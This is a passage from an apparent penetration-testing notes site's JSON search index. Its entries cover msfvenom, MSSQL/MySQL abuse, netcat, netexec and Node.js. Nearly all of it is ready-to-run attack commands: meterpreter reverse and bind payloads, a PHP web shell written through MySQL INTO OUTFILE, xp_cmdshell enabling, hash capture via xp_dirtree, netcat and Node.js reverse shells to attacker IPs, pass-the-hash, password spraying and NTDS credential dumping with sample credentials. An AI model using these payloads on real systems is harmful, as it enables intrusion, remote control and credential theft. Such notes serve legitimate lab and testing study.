LPORT=\u0026lt;Local Port\u0026gt; -f raw \u0026gt; shell.sh\r","date":"2023-09-07","id":74,"permalink":"/notes/shell-and-payload/msfvenom/","summary":"\u003ch2 id=\"windows\"\u003eWindows\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eReverse Shell meterpreter\u003c/strong\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emsfvenom -p windows/meterpreter/reverse_tcp \u003cspan class=\"nv\"\u003eLHOST\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10.10.15.18 \u003cspan class=\"nv\"\u003eLPORT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5050\u003c/span\u003e -f exe \u0026gt; reverse.exe\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eBind Shell\u003c/strong\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emsfvenom -p windows/meterpreter/bind_tcp \u003cspan class=\"nv\"\u003eRHOST\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003eIP Address\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003eLPORT\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003eYour Port\u003cspan class=\"o\"\u003e)\u003c/span\u003e -f exe \u0026gt; bind.exe\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eCMD Shell\u003c/strong\u003e\u003c/p\u003e","tags":[],"title":"MsfVenom"},{"content":"Mysql\nUpload file when root : select \u0026#39;\u0026lt;?php echo \u0026#34;command: \u0026#34; . system($_REQUEST[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; into outfile \u0026#34;C:\\\\xampp\\\\htdocs\\\\dev\\\\shell.php\u0026#34;;\rRead file : SELECT LOAD_FILE(\u0026#39;C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\u0026#39;);\rCheck permissions : SHOW GRANTS FOR CURRENT_USER; select system_user();\rMSSQL\nEnable xp_cmdshell with sp_configure EXEC sp_configure \u0026#39;show advanced options\u0026#39;, \u0026#39;1\u0026#39; RECONFIGURE # this enables xp_cmdshell EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, \u0026#39;1\u0026#39; RECONFIGURE\rDisable xp_cmdshell with sp_configure EXEC sp_configure \u0026#39;show advanced options\u0026#39;, \u0026#39;1\u0026#39; RECONFIGURE #this disables xp_cmdshell EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, \u0026#39;0\u0026#39; RECONFIGURE EXEC xp_cmdshell \u0026#39;whoami\u0026#39;;\rMssql command : enum_db use db; SELECT TABLE_NAME FROM Demo.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = \u0026#39;BASE TABLE\u0026#39;; SELECT * from db;\rCatch hash with xp_dirtree : EXEC master.sys.xp_dirtree \u0026#39;\\\\10.8.3.12\\myshare\u0026#39;,1,1 smbserver.py -smb2support share . #or responder --interface \u0026#34;tun0\u0026#34; -wd\r","date":"2023-09-07","id":75,"permalink":"/notes/services/mssql-mysql/","summary":"\u003cp\u003e\u003cstrong\u003eMysql\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUpload file when root :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u0026lt;?php echo \u0026#34;command: \u0026#34; . system($_REQUEST[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003einto\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eoutfile\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;C:\\\\xampp\\\\htdocs\\\\dev\\\\shell.php\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eRead file :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSELECT LOAD_FILE\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCheck permissions :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eSHOW\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eGRANTS\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eFOR\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eCURRENT_USER\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003esystem_user\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eMSSQL\u003c/strong\u003e\u003c/p\u003e","tags":[],"title":"Mssql-Mysql"},{"content":"\rmkfifo /tmp/f;nc 10.8.3.12 4242 0\u0026lt;/tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|tee /tmp/f\rmknod /tmp/f p;nc 10.10.15.18 4242 0\u0026lt;/tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|tee /tmp/f\r","date":"2023-09-07","id":76,"permalink":"/notes/shell-and-payload/netcat/","summary":"\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkfifo /tmp/f\u003cspan class=\"p\"\u003e;\u003c/span\u003enc 10.8.3.12 \u003cspan class=\"m\"\u003e4242\u003c/span\u003e 0\u0026lt;/tmp/f\u003cspan class=\"p\"\u003e|\u003c/span\u003e/bin/sh -i 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e1\u003cspan class=\"p\"\u003e|\u003c/span\u003etee /tmp/f\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emknod /tmp/f p\u003cspan class=\"p\"\u003e;\u003c/span\u003enc 10.10.15.18 \u003cspan class=\"m\"\u003e4242\u003c/span\u003e 0\u0026lt;/tmp/f\u003cspan class=\"p\"\u003e|\u003c/span\u003e/bin/sh -i 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e1\u003cspan class=\"p\"\u003e|\u003c/span\u003etee /tmp/f\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Netcat"},{"content":" Check : # Target format netexec smb ms.evilcorp.org netexec smb 192.168.1.0 192.168.0.2\rNull session : # Null session netexec smb 192.168.10.1 -u \u0026#34;\u0026#34; up \u0026#34;\u0026#34;\rPass the hash : # Pass the hash against a subnet netexec smb 172.16.157.0/24 -u administrator -H \u0026#39;LMHASH:NTHASH\u0026#39; --local-auth netexec smb 172.16.157.0/24 -u administrator -H \u0026#39;NTHASH\u0026#39;\rEnum smb shared folder : netexec smb $t2 -u \u0026#39;rsmith\u0026#39; -p \u0026#39;IHateEric2\u0026#39; --shares\rPassword spraying : netexec smb $t -u user.txt -p user.txt --no-bruteforce --continue-on-success netexec ldap $t -u usernames.txt -p \u0026#39;BabyStart123!\u0026#39; --local-auth\rDownload Share : netexec smb 10.10.65.99 -u \u0026#34;trainee\u0026#34; -p \u0026#34;trainee\u0026#34; -M spider_plus -o DOWNLOAD_FLAG=True~\rCertificate : nxc ldap 10.10.137.165 -u \u0026#39;peter.turner\u0026#39; -p \u0026#39;b0cwR+G4Dzl_rw\u0026#39; -M adcs nxc ldap 10.10.137.165 -u \u0026#39;peter.turner\u0026#39; -p \u0026#39;b0cwR+G4Dzl_rw\u0026#39; -M adcs -o SERVER=hybrid-DC01-CA\rCredential dumping nxc smb 10.10.137.165 -u Administrator -H \u0026#39;60701e8543c9f6db1a2af3217386d3dc\u0026#39; --ntds\rCheck if there is an AV : nxc smb \u0026lt;ip\u0026gt; -u user -p pass -M enum_av\rPassword Policy nxc smb 192.168.1.0/24 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --pass-pol\rBrute force Rid (Other way to enumerate users ) nxc smb 192.168.1.0/24 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --rid-brute\rCheck MAQ : nxc ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq\r","date":"2023-09-07","id":77,"permalink":"/notes/ad/tools/netexec/","summary":"\u003cul\u003e\n\u003cli\u003eCheck :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Target format\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb ms.evilcorp.org\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 192.168.1.0 192.168.0.2\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eNull session :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Null session\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 192.168.10.1 -u \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e up \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003ePass the hash :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Pass the hash against a subnet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 172.16.157.0/24 -u administrator -H \u003cspan class=\"s1\"\u003e\u0026#39;LMHASH:NTHASH\u0026#39;\u003c/span\u003e --local-auth\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 172.16.157.0/24 -u administrator -H \u003cspan class=\"s1\"\u003e\u0026#39;NTHASH\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEnum smb shared folder :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb \u003cspan class=\"nv\"\u003e$t2\u003c/span\u003e -u \u003cspan class=\"s1\"\u003e\u0026#39;rsmith\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;IHateEric2\u0026#39;\u003c/span\u003e --shares\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003ePassword spraying :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -u user.txt -p user.txt --no-bruteforce --continue-on-success\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec ldap \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -u usernames.txt -p \u003cspan class=\"s1\"\u003e\u0026#39;BabyStart123!\u0026#39;\u003c/span\u003e --local-auth\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDownload Share :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 10.10.65.99 -u \u003cspan class=\"s2\"\u003e\u0026#34;trainee\u0026#34;\u003c/span\u003e -p \u003cspan class=\"s2\"\u003e\u0026#34;trainee\u0026#34;\u003c/span\u003e -M spider_plus -o \u003cspan class=\"nv\"\u003eDOWNLOAD_FLAG\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eTrue~\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCertificate :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc ldap 10.10.137.165 -u \u003cspan class=\"s1\"\u003e\u0026#39;peter.turner\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;b0cwR+G4Dzl_rw\u0026#39;\u003c/span\u003e -M adcs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc ldap 10.10.137.165 -u \u003cspan class=\"s1\"\u003e\u0026#39;peter.turner\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;b0cwR+G4Dzl_rw\u0026#39;\u003c/span\u003e -M adcs -o \u003cspan class=\"nv\"\u003eSERVER\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehybrid-DC01-CA\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCredential dumping\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc smb 10.10.137.165 -u Administrator -H \u003cspan class=\"s1\"\u003e\u0026#39;60701e8543c9f6db1a2af3217386d3dc\u0026#39;\u003c/span\u003e --ntds\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCheck if there is an AV :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc smb \u0026lt;ip\u0026gt; -u user -p pass -M enum_av\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003ePassword Policy\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc smb 192.168.1.0/24 -u UserNAme -p \u003cspan class=\"s1\"\u003e\u0026#39;PASSWORDHERE\u0026#39;\u003c/span\u003e --pass-pol\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eBrute force Rid (Other way to enumerate users )\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc smb 192.168.1.0/24 -u UserNAme -p \u003cspan class=\"s1\"\u003e\u0026#39;PASSWORDHERE\u0026#39;\u003c/span\u003e --rid-brute\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCheck MAQ :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc ldap \u003cspan class=\"nv\"\u003e$DOMAIN_CONTROLLER\u003c/span\u003e -d \u003cspan class=\"nv\"\u003e$DOMAIN\u003c/span\u003e -u \u003cspan class=\"nv\"\u003e$USER\u003c/span\u003e -p \u003cspan class=\"nv\"\u003e$PASSWORD\u003c/span\u003e -M maq\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Netexec"},{"content":"","date":"2023-09-07","id":78,"permalink":"/notes/code/nodejs/","summary":"","tags":[],"title":"Nodejs"},{"content":"\r(function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(4242, \u0026#34;10.10.15.18\u0026#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })();\r","date":"2023-09-07","id":79,"permalink":"/notes/shell-and-payload/nodejs/","summary":"\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e(){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    var \u003cspan class=\"nv\"\u003enet\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;net\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ecp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;child_process\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003esh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e cp.spawn\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/bin/sh\u0026#34;\u003c/span\u003e, \u003cspan class=\"o\"\u003e[])\u003c/span\u003e\u003cspan 